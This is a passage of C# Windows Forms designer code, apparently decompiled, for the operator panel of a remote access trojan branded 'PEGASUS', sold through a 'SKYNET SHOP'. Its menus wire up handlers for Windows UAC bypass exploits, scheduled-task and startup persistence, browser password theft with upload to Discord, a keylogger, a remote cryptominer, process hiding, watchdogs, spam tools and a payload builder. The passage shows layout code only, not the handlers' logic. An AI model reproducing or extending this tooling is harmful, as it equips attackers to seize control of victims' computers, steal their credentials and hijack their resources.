			toolStripMenuItem44.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem44.Image");
			toolStripMenuItem44.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem44.Name = "toolStripMenuItem44";
			toolStripMenuItem44.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem44.Text = "      [Privilege Escalation]";
			toolStripMenuItem45.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem45.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem45.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem45.Image");
			toolStripMenuItem45.Name = "toolStripMenuItem45";
			toolStripMenuItem45.Size = new System.Drawing.Size(263, 36);
			toolStripMenuItem45.Text = "     1. Windows 10/11 Uac Exploit";
			toolStripMenuItem45.Click += new System.EventHandler(SilentCleanupToolStripMenuItem_Click);
			toolStripMenuItem46.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem46.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem46.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem46.Image");
			toolStripMenuItem46.Name = "toolStripMenuItem46";
			toolStripMenuItem46.Size = new System.Drawing.Size(263, 36);
			toolStripMenuItem46.Text = "     2. Windows 10/11 Uac Exploit";
			toolStripMenuItem46.Click += new System.EventHandler(FodhelperToolStripMenuItem_Click);
			toolStripMenuItem48.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem48.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem48.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem48.Image");
			toolStripMenuItem48.Name = "toolStripMenuItem48";
			toolStripMenuItem48.Size = new System.Drawing.Size(263, 36);
			toolStripMenuItem48.Text = "     3. Windows 7 Uac Exploit";
			toolStripMenuItem48.Click += new System.EventHandler(CompMgmtLauncherToolStripMenuItem_Click);
			toolStripMenuItem47.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem47.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem47.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem47.Image");
			toolStripMenuItem47.Name = "toolStripMenuItem47";
			toolStripMenuItem47.Size = new System.Drawing.Size(263, 36);
			toolStripMenuItem47.Text = "     4. Run as admin";
			toolStripMenuItem47.Click += new System.EventHandler(RunasToolStripMenuItem_Click);
			toolStripMenuItem49.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem50, toolStripMenuItem52 });
			toolStripMenuItem49.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem49.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem49.Image");
			toolStripMenuItem49.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem49.Name = "toolStripMenuItem49";
			toolStripMenuItem49.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem49.Text = "      [Persistence Startup/Task]";
			toolStripMenuItem50.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem50.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem51, addPEGASUSSheduleTaskToolStripMenuItem });
			toolStripMenuItem50.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem50.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem50.Image");
			toolStripMenuItem50.Name = "toolStripMenuItem50";
			toolStripMenuItem50.Size = new System.Drawing.Size(259, 36);
			toolStripMenuItem50.Text = "     Add PEGASUS Shedule Task";
			toolStripMenuItem51.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem51.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem51.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem51.Image");
			toolStripMenuItem51.Name = "toolStripMenuItem51";
			toolStripMenuItem51.Size = new System.Drawing.Size(259, 36);
			toolStripMenuItem51.Text = "     Remove PEGASUS Task";
			toolStripMenuItem51.Click += new System.EventHandler(toolStripMenuItem51_Click);
			addPEGASUSSheduleTaskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			addPEGASUSSheduleTaskToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			addPEGASUSSheduleTaskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("addPEGASUSSheduleTaskToolStripMenuItem.Image");
			addPEGASUSSheduleTaskToolStripMenuItem.Name = "addPEGASUSSheduleTaskToolStripMenuItem";
			addPEGASUSSheduleTaskToolStripMenuItem.Size = new System.Drawing.Size(259, 36);
			addPEGASUSSheduleTaskToolStripMenuItem.Text = "     Add PEGASUS Shedule Task";
			addPEGASUSSheduleTaskToolStripMenuItem.Click += new System.EventHandler(SchtaskInstallToolStripMenuItem_Click);
			toolStripMenuItem52.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem52.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem53, addPEGASUSToStartupToolStripMenuItem });
			toolStripMenuItem52.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem52.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem52.Image");
			toolStripMenuItem52.Name = "toolStripMenuItem52";
			toolStripMenuItem52.Size = new System.Drawing.Size(259, 36);
			toolStripMenuItem52.Text = "     Add PEGASUS Startup";
			toolStripMenuItem53.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem53.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem53.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem53.Image");
			toolStripMenuItem53.Name = "toolStripMenuItem53";
			toolStripMenuItem53.Size = new System.Drawing.Size(282, 36);
			toolStripMenuItem53.Text = "     Remove PEGASUS from Startup";
			toolStripMenuItem53.Click += new System.EventHandler(toolStripMenuItem53_Click);
			addPEGASUSToStartupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			addPEGASUSToStartupToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			addPEGASUSToStartupToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("addPEGASUSToStartupToolStripMenuItem.Image");
			addPEGASUSToStartupToolStripMenuItem.Name = "addPEGASUSToStartupToolStripMenuItem";
			addPEGASUSToStartupToolStripMenuItem.Size = new System.Drawing.Size(282, 36);
			addPEGASUSToStartupToolStripMenuItem.Text = "     Add PEGASUS to Startup";
			addPEGASUSToStartupToolStripMenuItem.Click += new System.EventHandler(normalInstallToolStripMenuItem_Click);
			passwordRecoveryToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { toolStripMenuItem31, sKYNETToolStripMenuItem, recoverAllSendToDiscordToolStripMenuItem, toolStripMenuItem80 });
			passwordRecoveryToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			passwordRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("passwordRecoveryToolStripMenuItem.Image");
			passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
			passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			passwordRecoveryToolStripMenuItem.Text = "      [Password Recovery/Keylogger]";
			toolStripMenuItem31.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem31.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem31.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem31.Image");
			toolStripMenuItem31.Name = "toolStripMenuItem31";
			toolStripMenuItem31.Size = new System.Drawing.Size(272, 36);
			toolStripMenuItem31.Text = "     Password Recovery";
			toolStripMenuItem31.Click += new System.EventHandler(PasswordRecoveryToolStripMenuItem_Click);
			sKYNETToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			sKYNETToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			sKYNETToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sKYNETToolStripMenuItem.Image");
			sKYNETToolStripMenuItem.Name = "sKYNETToolStripMenuItem";
			sKYNETToolStripMenuItem.Size = new System.Drawing.Size(272, 36);
			sKYNETToolStripMenuItem.Text = "      Skynet Recovery All Browsers";
			sKYNETToolStripMenuItem.Visible = false;
			sKYNETToolStripMenuItem.Click += new System.EventHandler(sKYNETToolStripMenuItem_Click);
			recoverAllSendToDiscordToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			recoverAllSendToDiscordToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			recoverAllSendToDiscordToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("recoverAllSendToDiscordToolStripMenuItem.Image");
			recoverAllSendToDiscordToolStripMenuItem.Name = "recoverAllSendToDiscordToolStripMenuItem";
			recoverAllSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(272, 36);
			recoverAllSendToDiscordToolStripMenuItem.Text = "      Recover All & Send to Discord";
			recoverAllSendToDiscordToolStripMenuItem.Click += new System.EventHandler(recoverAllSendToDiscordToolStripMenuItem_Click);
			toolStripMenuItem80.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem80.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem80.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem80.Image");
			toolStripMenuItem80.Name = "toolStripMenuItem80";
			toolStripMenuItem80.Size = new System.Drawing.Size(272, 36);
			toolStripMenuItem80.Text = "     Keylogger";
			toolStripMenuItem80.Click += new System.EventHandler(KeyloggerToolStripMenuItem1_Click);
			toolStripMenuItem54.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem54.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem54.Image");
			toolStripMenuItem54.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem54.Name = "toolStripMenuItem54";
			toolStripMenuItem54.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem54.Text = "      [Remote Fun Control]";
			toolStripMenuItem54.Click += new System.EventHandler(justForFunToolStripMenuItem_Click);
			toolStripMenuItem55.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem55.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem55.Image");
			toolStripMenuItem55.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem55.Name = "toolStripMenuItem55";
			toolStripMenuItem55.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem55.Text = "      [Remote  PC Information]";
			toolStripMenuItem55.Click += new System.EventHandler(InformationToolStripMenuItem_Click);
			toolStripMenuItem56.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { startToolStripMenuItem1, stopToolStripMenuItem1 });
			toolStripMenuItem56.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem56.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem56.Image");
			toolStripMenuItem56.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem56.Name = "toolStripMenuItem56";
			toolStripMenuItem56.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem56.Text = "      [Remote Miner]";
			startToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			startToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			startToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem1.Image");
			startToolStripMenuItem1.Name = "startToolStripMenuItem1";
			startToolStripMenuItem1.Size = new System.Drawing.Size(129, 36);
			startToolStripMenuItem1.Text = "    Start";
			startToolStripMenuItem1.Click += new System.EventHandler(startToolStripMenuItem1_Click_1);
			stopToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stopToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			stopToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem1.Image");
			stopToolStripMenuItem1.Name = "stopToolStripMenuItem1";
			stopToolStripMenuItem1.Size = new System.Drawing.Size(129, 36);
			stopToolStripMenuItem1.Text = "    Stop";
			stopToolStripMenuItem1.Click += new System.EventHandler(stopToolStripMenuItem1_Click_1);
			hIDEPEGASUSPROCESSToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripMenuItem82, toolStripMenuItem83 });
			hIDEPEGASUSPROCESSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			hIDEPEGASUSPROCESSToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hIDEPEGASUSPROCESSToolStripMenuItem.Image");
			hIDEPEGASUSPROCESSToolStripMenuItem.Name = "hIDEPEGASUSPROCESSToolStripMenuItem";
			hIDEPEGASUSPROCESSToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			hIDEPEGASUSPROCESSToolStripMenuItem.Text = "      [Hide Pegasus Proccess]";
			toolStripMenuItem82.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem82.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem82.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem82.Image");
			toolStripMenuItem82.Name = "toolStripMenuItem82";
			toolStripMenuItem82.Size = new System.Drawing.Size(129, 36);
			toolStripMenuItem82.Text = "    Start";
			toolStripMenuItem82.Click += new System.EventHandler(toolStripMenuItem82_Click);
			toolStripMenuItem83.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem83.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem83.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem83.Image");
			toolStripMenuItem83.Name = "toolStripMenuItem83";
			toolStripMenuItem83.Size = new System.Drawing.Size(129, 36);
			toolStripMenuItem83.Text = "    Stop";
			toolStripMenuItem83.Click += new System.EventHandler(toolStripMenuItem83_Click);
			watchDogToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			watchDogToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { startToolStripMenuItem3, stopToolStripMenuItem2 });
			watchDogToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			watchDogToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("watchDogToolStripMenuItem.Image");
			watchDogToolStripMenuItem.Name = "watchDogToolStripMenuItem";
			watchDogToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			watchDogToolStripMenuItem.Text = "      [WatchDog]";
			startToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			startToolStripMenuItem3.ForeColor = System.Drawing.Color.LightGray;
			startToolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem3.Image");
			startToolStripMenuItem3.Name = "startToolStripMenuItem3";
			startToolStripMenuItem3.Size = new System.Drawing.Size(129, 36);
			startToolStripMenuItem3.Text = "    Start";
			startToolStripMenuItem3.Click += new System.EventHandler(startToolStripMenuItem3_Click);
			stopToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stopToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			stopToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem2.Image");
			stopToolStripMenuItem2.Name = "stopToolStripMenuItem2";
			stopToolStripMenuItem2.Size = new System.Drawing.Size(129, 36);
			stopToolStripMenuItem2.Text = "    Stop";
			stopToolStripMenuItem2.Click += new System.EventHandler(stopToolStripMenuItem2_Click_1);
			taskMgrDogToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			taskMgrDogToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { startToolStripMenuItem4, stopToolStripMenuItem4 });
			taskMgrDogToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			taskMgrDogToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("taskMgrDogToolStripMenuItem.Image");
			taskMgrDogToolStripMenuItem.Name = "taskMgrDogToolStripMenuItem";
			taskMgrDogToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			taskMgrDogToolStripMenuItem.Text = "      [TaskMgrDog]";
			startToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			startToolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
			startToolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem4.Image");
			startToolStripMenuItem4.Name = "startToolStripMenuItem4";
			startToolStripMenuItem4.Size = new System.Drawing.Size(129, 36);
			startToolStripMenuItem4.Text = "    Start";
			startToolStripMenuItem4.Click += new System.EventHandler(startToolStripMenuItem4_Click);
			stopToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stopToolStripMenuItem4.ForeColor = System.Drawing.Color.LightGray;
			stopToolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem4.Image");
			stopToolStripMenuItem4.Name = "stopToolStripMenuItem4";
			stopToolStripMenuItem4.Size = new System.Drawing.Size(129, 36);
			stopToolStripMenuItem4.Text = "    Stop";
			stopToolStripMenuItem4.Click += new System.EventHandler(stopToolStripMenuItem4_Click);
			spamToolsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { sendEmailFromClientPCToolStripMenuItem, webHookSpammerToolStripMenuItem, chatSpammerToolStripMenuItem });
			spamToolsToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			spamToolsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("spamToolsToolStripMenuItem.Image");
			spamToolsToolStripMenuItem.Name = "spamToolsToolStripMenuItem";
			spamToolsToolStripMenuItem.Size = new System.Drawing.Size(284, 36);
			spamToolsToolStripMenuItem.Text = "      [Spam Tools]";
			sendEmailFromClientPCToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			sendEmailFromClientPCToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			sendEmailFromClientPCToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sendEmailFromClientPCToolStripMenuItem.Image");
			sendEmailFromClientPCToolStripMenuItem.Name = "sendEmailFromClientPCToolStripMenuItem";
			sendEmailFromClientPCToolStripMenuItem.Size = new System.Drawing.Size(248, 36);
			sendEmailFromClientPCToolStripMenuItem.Text = "    Send Email From Client PC";
			sendEmailFromClientPCToolStripMenuItem.Visible = false;
			sendEmailFromClientPCToolStripMenuItem.Click += new System.EventHandler(sendEmailFromClientPCToolStripMenuItem_Click);
			webHookSpammerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			webHookSpammerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { startToolStripMenuItem2, stopToolStripMenuItem5 });
			webHookSpammerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			webHookSpammerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("webHookSpammerToolStripMenuItem.Image");
			webHookSpammerToolStripMenuItem.Name = "webHookSpammerToolStripMenuItem";
			webHookSpammerToolStripMenuItem.Size = new System.Drawing.Size(248, 36);
			webHookSpammerToolStripMenuItem.Text = "    WebHook Spammer";
			startToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			startToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			startToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem2.Image");
			startToolStripMenuItem2.Name = "startToolStripMenuItem2";
			startToolStripMenuItem2.Size = new System.Drawing.Size(131, 36);
			startToolStripMenuItem2.Text = "     Send";
			startToolStripMenuItem2.Click += new System.EventHandler(startToolStripMenuItem2_Click_1);
			stopToolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stopToolStripMenuItem5.ForeColor = System.Drawing.Color.LightGray;
			stopToolStripMenuItem5.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem5.Image");
			stopToolStripMenuItem5.Name = "stopToolStripMenuItem5";
			stopToolStripMenuItem5.Size = new System.Drawing.Size(131, 36);
			stopToolStripMenuItem5.Text = "     Stop";
			stopToolStripMenuItem5.Visible = false;
			stopToolStripMenuItem5.Click += new System.EventHandler(stopToolStripMenuItem5_Click);
			chatSpammerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			chatSpammerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			chatSpammerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("chatSpammerToolStripMenuItem.Image");
			chatSpammerToolStripMenuItem.Name = "chatSpammerToolStripMenuItem";
			chatSpammerToolStripMenuItem.Size = new System.Drawing.Size(248, 36);
			chatSpammerToolStripMenuItem.Text = "    Chat Spammer";
			chatSpammerToolStripMenuItem.Visible = false;
			chatSpammerToolStripMenuItem.Click += new System.EventHandler(chatSpammerToolStripMenuItem_Click);
			toolStripMenuItem57.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { toolStripMenuItem60, toolStripMenuItem59, pEGASUSBUILDERToolStripMenuItem, sKYNETSHOPToolStripMenuItem, openSupportTicketToolStripMenuItem });
			toolStripMenuItem57.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem57.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem57.Image");
			toolStripMenuItem57.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem57.Name = "toolStripMenuItem57";
			toolStripMenuItem57.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem57.Text = "      [PEGASUS]";
			toolStripMenuItem57.Click += new System.EventHandler(builderToolStripMenuItem1_Click_1);
			toolStripMenuItem60.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem60.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem60.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem60.Image");
			toolStripMenuItem60.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem60.Name = "toolStripMenuItem60";
			toolStripMenuItem60.Size = new System.Drawing.Size(230, 36);
			toolStripMenuItem60.Text = "    License Status/Update";
			toolStripMenuItem60.Click += new System.EventHandler(aboutToolStripMenuItem1_Click_1);
			toolStripMenuItem59.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem59.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem59.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem59.Image");
			toolStripMenuItem59.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem59.Name = "toolStripMenuItem59";
			toolStripMenuItem59.Size = new System.Drawing.Size(230, 36);
			toolStripMenuItem59.Text = "    Video/Documentation";
			toolStripMenuItem59.Click += new System.EventHandler(toolStripMenuItem59_Click);
			pEGASUSBUILDERToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			pEGASUSBUILDERToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			pEGASUSBUILDERToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("pEGASUSBUILDERToolStripMenuItem.Image");
			pEGASUSBUILDERToolStripMenuItem.Name = "pEGASUSBUILDERToolStripMenuItem";
			pEGASUSBUILDERToolStripMenuItem.Size = new System.Drawing.Size(230, 36);
			pEGASUSBUILDERToolStripMenuItem.Text = "    PEGASUS BUILDER";
			pEGASUSBUILDERToolStripMenuItem.Click += new System.EventHandler(builderToolStripMenuItem1_Click_1);
			sKYNETSHOPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			sKYNETSHOPToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			sKYNETSHOPToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sKYNETSHOPToolStripMenuItem.Image");
			sKYNETSHOPToolStripMenuItem.Name = "sKYNETSHOPToolStripMenuItem";
			sKYNETSHOPToolStripMenuItem.Size = new System.Drawing.Size(230, 36);
			sKYNETSHOPToolStripMenuItem.Text = "    SKYNET SHOP";
			sKYNETSHOPToolStripMenuItem.Click += new System.EventHandler(sKYNETSHOPToolStripMenuItem_Click);
			openSupportTicketToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			openSupportTicketToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			openSupportTicketToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("openSupportTicketToolStripMenuItem.Image");
			openSupportTicketToolStripMenuItem.Name = "openSupportTicketToolStripMenuItem";
			openSupportTicketToolStripMenuItem.Size = new System.Drawing.Size(230, 36);
			openSupportTicketToolStripMenuItem.Text = "    Open Support Ticket";
			openSupportTicketToolStripMenuItem.Click += new System.EventHandler(openSupportTicketToolStripMenuItem_Click);
			toolStripMenuItem58.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem58.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem58.Image");
			toolStripMenuItem58.ImageTransparentColor = System.Drawing.Color.Transparent;
			toolStripMenuItem58.Name = "toolStripMenuItem58";
			toolStripMenuItem58.Size = new System.Drawing.Size(284, 36);
			toolStripMenuItem58.Text = "    Block Clients";
			toolStripMenuItem58.Visible = false;
			toolStripMenuItem58.Click += new System.EventHandler(BlockToolStripMenuItem_Click);
			LISTVIEWSPANELSMALL2.AutoSize = true;
			LISTVIEWSPANELSMALL2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			LISTVIEWSPANELSMALL2.BackgroundImage = (System.Drawing.Image)resources.GetObject("LISTVIEWSPANELSMALL2.BackgroundImage");
			LISTVIEWSPANELSMALL2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			LISTVIEWSPANELSMALL2.Controls.Add(label5);
			LISTVIEWSPANELSMALL2.Controls.Add(label6);
			LISTVIEWSPANELSMALL2.Controls.Add(guna2Separator1);
			LISTVIEWSPANELSMALL2.Controls.Add(label1);
			LISTVIEWSPANELSMALL2.Controls.Add(pictureBox1);
			loadForm.SetDecoration(LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
			LISTVIEWSPANELSMALL2.Dock = System.Windows.Forms.DockStyle.Top;
			LISTVIEWSPANELSMALL2.Location = new System.Drawing.Point(0, 0);
			LISTVIEWSPANELSMALL2.Name = "LISTVIEWSPANELSMALL2";
			LISTVIEWSPANELSMALL2.ShadowDecoration.Parent = LISTVIEWSPANELSMALL2;
			LISTVIEWSPANELSMALL2.Size = new System.Drawing.Size(1416, 76);
			LISTVIEWSPANELSMALL2.TabIndex = 6;
			LISTVIEWSPANELSMALL2.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			label5.AutoSize = true;
			label5.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
			label5.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label5.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			label5.Location = new System.Drawing.Point(175, 27);
			label5.Name = "label5";
			label5.Size = new System.Drawing.Size(50, 19);
			label5.TabIndex = 12;
			label5.Text = "User";
			label6.AutoSize = true;
			label6.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label6, Guna.UI2.AnimatorNS.DecorationType.None);
			label6.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label6.ForeColor = System.Drawing.Color.Silver;
			label6.Location = new System.Drawing.Point(81, 27);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(88, 19);
			label6.TabIndex = 11;
			label6.Text = "Welcome:";
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(0, 70);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1416, 11);
			guna2Separator1.TabIndex = 9;
			guna2Separator1.UseTransparentBackground = true;
			label1.AutoSize = true;
